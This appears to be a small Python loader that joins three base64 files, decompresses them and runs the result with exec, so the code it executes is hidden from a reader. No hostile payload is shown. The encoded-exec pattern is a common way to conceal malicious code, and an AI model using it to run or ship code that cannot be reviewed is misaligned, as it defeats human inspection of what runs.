# compressed loader v3.1 link-fix
import zlib, base64
from pathlib import Path
_dir = Path(__file__).parent
_b64 = ""
for i in range(1, 4):
    _b64 += (_dir / f"save_media_src_{i}.b64").read_text(encoding="utf-8").strip()
_src = zlib.decompress(base64.b64decode(_b64)).decode("utf-8")
exec(compile(_src, __file__, "exec"), globals())
